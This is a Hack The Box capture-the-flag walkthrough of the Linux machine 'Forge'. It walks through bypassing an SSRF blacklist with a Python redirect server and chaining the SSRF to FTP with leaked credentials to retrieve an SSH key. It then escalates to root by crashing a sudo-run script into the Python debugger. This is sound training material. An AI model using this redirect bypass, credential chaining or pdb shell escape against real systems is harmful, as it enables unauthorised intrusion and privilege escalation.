---
title: "HTB: Forge"
date: 2022-05-27
draft: false
os: "Linux"
difficulty: "Medium"
platform: "HTB"
aliases: ["/posts/htb/forge/"]
tags:
  - htb
  - medium
  - linux
  - ssrf
  - ssrf-redirect
  - ftp
  - python-pdb
categories:
  - walkthrough
---

{{< box-info name="Forge" os="Linux" difficulty="Medium" ip="10.129.106.197" platform="HTB" >}}

---

## Recon

Subdomain brute-force reveals `admin.forge.htb`, but it only responds to requests from localhost:

```bash
curl http://forge.htb -H 'Host: admin.forge.htb'
# Only localhost is allowed!
```

---

## Enumeration

### Nmap

{{< collapse title="Nmap output" >}}
```
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3
80/tcp open     http    Apache httpd 2.4.41
```
{{< /collapse >}}

**OS**: Ubuntu 20.04 (Focal)

### Port 80 - Web App

The web app has an upload feature that accepts files either locally or via URL:

![Upload functionality with URL option](/images/forge/upload-func.png)

The URL upload is interesting -- it sends a server-side request to fetch the resource. Uploaded files get saved as `.jpg` at `http://forge.htb/uploads/<random>`. This smells like SSRF.

Attempting to point the URL at `127.0.0.1` gets blocked by a blacklist. Direct attempts at `admin.forge.htb` are also filtered.

---

## Foothold

### SSRF via Redirect

The blacklist filters the initial URL, but not redirect targets. Using a simple Python redirect server to bypass:

```python
#!/usr/bin/env python3
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.send_response(302)
       self.send_header('Location', sys.argv[2])
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

```bash
python3 ./ssrf_r.py 8000 http://admin.forge.htb
```

Submit our server's URL through the upload form -- the server follows the redirect to `admin.forge.htb` and we can read the response through the uploads endpoint.

![Successful SSRF redirect reaching admin portal](/images/forge/admin-request.png)

### Enumerating the Admin Portal

Through the SSRF, reading the `/announcements` page reveals:

- Internal FTP credentials: `user:heightofsecurity123!`
- The `/upload` endpoint supports FTP, and accepts `?u=<url>` for scripted uploads

### FTP Access via SSRF

Chaining the SSRF with FTP access:

```bash
python3 ./ssrf_r.py 8000 \
  'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21'
```

![FTP directory listing showing user flag](/images/forge/ftp-user-flag.png)

The FTP root is the user's home directory. Checking for SSH keys:

```bash
python3 ./ssrf_r.py 8000 \
  'http://admin.forge.htb/upload?u=ftp://user:heightofsecurity123!@10.129.106.197:21/.ssh/'
```

![SSH directory contents](/images/forge/ssh-directory.png)

Grab the `id_rsa` key and SSH in as `user`.

---

## Privilege Escalation

### Python PDB Escape

Checking sudo permissions:

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/bin/python3 /opt/remote-manage.py
```

The script is a socket-based admin tool that listens on a random port. The critical part: on any exception, it drops into `pdb.post_mortem()` -- the Python debugger, running as root.

{{< collapse title="remote-manage.py" >}}
```python
#!/usr/bin/env python3
import socket
import random
import subprocess
import pdb

port = random.randint(1025, 65535)

try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('127.0.0.1', port))
    sock.listen(1)
    print(f'Listening on localhost:{port}')
    (clientsock, addr) = sock.accept()
    clientsock.send(b'Enter the secret passsword: ')
    if clientsock.recv(1024).strip().decode() != 'secretadminpassword':
        clientsock.send(b'Wrong password!\n')
    else:
        clientsock.send(b'Welcome admin!\n')
        while True:
            clientsock.send(b'\nWhat do you wanna do: \n')
            clientsock.send(b'[1] View processes\n')
            clientsock.send(b'[2] View free memory\n')
            clientsock.send(b'[3] View listening sockets\n')
            clientsock.send(b'[4] Quit\n')
            option = int(clientsock.recv(1024).strip())
            # ...
except Exception as e:
    print(e)
    pdb.post_mortem(e.__traceback__)
finally:
    quit()
```
{{< /collapse >}}

The exploit:
1. Run the script with sudo, note the random port
2. From another session, connect and authenticate with `secretadminpassword`
3. Send a non-integer input (e.g., `a`) to trigger `ValueError`
4. The script crashes into PDB as root

{{< terminal title="root@forge" >}}
(Pdb) import os
(Pdb) os.system("sh")
# whoami
root
{{< /terminal >}}

---

## Proof

{{< terminal title="root@forge" >}}
# cat /root/root.txt
[redacted]
{{< /terminal >}}

---

## Key Takeaways

{{< callout type="note" >}}
- SSRF blacklists that don't account for redirects are trivially bypassed
- When you find SSRF, always check for internal services (FTP, admin panels) accessible from localhost
- Python scripts with `pdb.post_mortem()` in exception handlers are a privesc goldmine if you can trigger the exception
- Always check `sudo -l` -- even unusual scripts can be leveraged
{{< /callout >}}
